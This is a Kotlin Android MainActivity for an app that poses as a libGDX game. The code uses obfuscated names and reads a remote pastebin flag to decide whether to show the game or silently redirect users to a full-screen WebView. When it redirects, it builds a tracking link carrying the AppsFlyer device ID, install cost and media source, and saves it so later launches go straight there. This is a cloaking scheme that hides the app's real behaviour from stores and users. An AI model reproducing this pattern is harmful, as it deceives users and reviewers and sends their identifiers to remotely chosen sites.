package italodisco.fernando.lucherano

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.view.View
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import italodisco.fernando.lucherano.util.webView.WebViewFragment
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import italodisco.fernando.lucherano.databinding.ActivityMainBinding
import italodisco.fernando.lucherano.util.AppsflyerUtil
import italodisco.fernando.lucherano.util.DSM
import italodisco.fernando.lucherano.util.Lottie
import italodisco.fernando.lucherano.util.Once
import italodisco.fernando.lucherano.util.internetConnection
import italodisco.fernando.lucherano.util.log
import italodisco.fernando.lucherano.util.setVisible
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.io.IOException
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val Jeko = 1000

        val poloraDo = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webURL              = "https://www.google.com/"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding      : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val bebraSobakaLotok = WebViewFragment(this)
    val okHttpClient     = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            coroutine.launch(Dispatchers.IO) {

                //poloraDo.tryEmit(R.id.libGDXFragment)
            checkDataStore()

                launch(Dispatchers.Main) {
                    poloraDo.collect { fragmentId ->
                        when (fragmentId) {
                            R.id.libGDXFragment -> {
                                /*binding.root.also { rootCL ->
                            ConstraintSet().apply {
                                clone(rootCL)
                                constrainPercentWidth(binding.loader.id, .23f)
                            }.applyTo(rootCL)
                        }*/

                                bebraSobakaLotok.goneWebView()
                                setNavigationBarColor(R.color.black)
                                setStartDestination(fragmentId)
                                ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                            }

                            Jeko                -> {
                                bebraSobakaLotok.showAndOpenUrl()
                                setNavigationBarColor(R.color.white)
                                ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                            }

                            else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }.also { requestedOrientation = it }
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        bebraSobakaLotok.onResume()
    }

    override fun onPause() {
        bebraSobakaLotok.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        bebraSobakaLotok.onActivityResult(requestCode, resultCode, data)
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)

        bebraSobakaLotok.onCreate(coroutine, binding.werdeGarden)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DSM.kliJ.get()) {
                "Poka" -> {
                    DSM.loDa.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        webURL = it
                        poloraDo.emit(Jeko)
                    }
                }
                "Priv" -> {
                    log("DataStoreManager Key = GAME")
                    poloraDo.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getFlag()
                }
            }
        }
    }

    private suspend fun getFlag() {
        val request: Request = Request.Builder().url("https://pastebin.com/raw/h1AcU5Uv").build()

        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val json = JSONObject(response.body?.string() ?: "")
                    log("getFlag SUCCESS: $json")

                    val flag      = json.getBoolean("illi")
                    val key       = json.getString("molly")
                    val privacy   = json.getString("fratenko")
                    val linkCheck = json.getString("sternenko")
                    val link      = json.getString("dronKomokAdze")

                    if (flag) getResponseFromServer(linkCheck, key, link)
                    else {
                        webURL = privacy
                        poloraDo.tryEmit(Jeko)

                        withContext(Dispatchers.Main) {
                            val btns = listOf(binding.aply , binding.cac)
                            btns.onEach { it.setVisible(View.VISIBLE) }

                            binding.cac.setOnClickListener {
                                exit()
                            }
                            binding.aply.setOnClickListener {
                                btns.onEach { it.setVisible(View.GONE) }
                                poloraDo.tryEmit(R.id.libGDXFragment)
                                lottie.showLoader()

                                coroutine.launch(Dispatchers.IO) {
                                    DSM.kliJ.update { "Priv" }
                                }
                            }
                        }
                    }
                } else {
                    log("getFlag newCall FAIL: ${response.code} ${response.message}")
                    poloraDo.tryEmit(R.id.libGDXFragment)
                }
            }
        } catch (e: IOException) {
            log("getFlag FAIL: $e")
            poloraDo.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun getResponseFromServer(linkCheck: String, key: String, link: String) {
        val request: Request = Request.Builder().url(linkCheck).build()

        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    log("getResponseFromServer SUCCESS code = ${response.code}")
                    generateAndOpenLink(key, link)
                } else {
                    log("getResponseFromServer newCall FAIL: ${response.code} ${response.message}")
                    poloraDo.tryEmit(R.id.libGDXFragment)
                }
            }
        } catch (e: IOException) {
            log("getResponseFromServer FAIL: $e")
            poloraDo.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun generateAndOpenLink(key: String, target: String) {
        coroutine.launch(Dispatchers.IO) {
            val completerFlow = MutableSharedFlow<Unit>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

            launch {
                AppsflyerUtil.initialize(this@MainActivity, key)
                AppsflyerUtil.checkFlow.collect { completerFlow.tryEmit(Unit) }
            }

            var counter = 0
            completerFlow.collect { if (++counter == 1) {
                val fullLink = target.plus("?") +
                        "sub1=".plus(AppsflyerUtil.campaignSubMap["sub1"].toString()).plus("&") +
                        "sub2=".plus(AppsflyerUtil.campaignSubMap["sub2"].toString()).plus("&") +
                        "sub3=".plus(AppsflyerUtil.campaignSubMap["sub3"].toString()).plus("&") +
                        "sub4=".plus(AppsflyerUtil.campaignSubMap["sub4"].toString()).plus("&") +
                        "sub5=".plus(AppsflyerUtil.campaignSubMap["sub5"].toString()).plus("&") +
                        "sub6=".plus(AppsflyerUtil.campaignSubMap["sub6"].toString()).plus("&") +
                        "sub_id_8=" .plus(AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)).plus("&") +
                        "sub_id_9=" .plus(AppsflyerUtil.dataMap["orig_cost"]     .toString()).plus("&") +
                        "sub_id_10=".plus(AppsflyerUtil.dataMap["cost_cents_USD"].toString()).plus("&") +
                        "sub_id_11=".plus(AppsflyerUtil.dataMap["media_source"]  .toString()).plus("&") +
                        "sub_id_12=".plus(appContext.packageName)

                log("full: $fullLink")

                webURL = fullLink
                poloraDo.tryEmit(Jeko)

                withContext(Dispatchers.IO) {
                    DSM.kliJ.update { "Poka" }
                    DSM.loDa.update { fullLink }
                }
            } }
        }
    }

}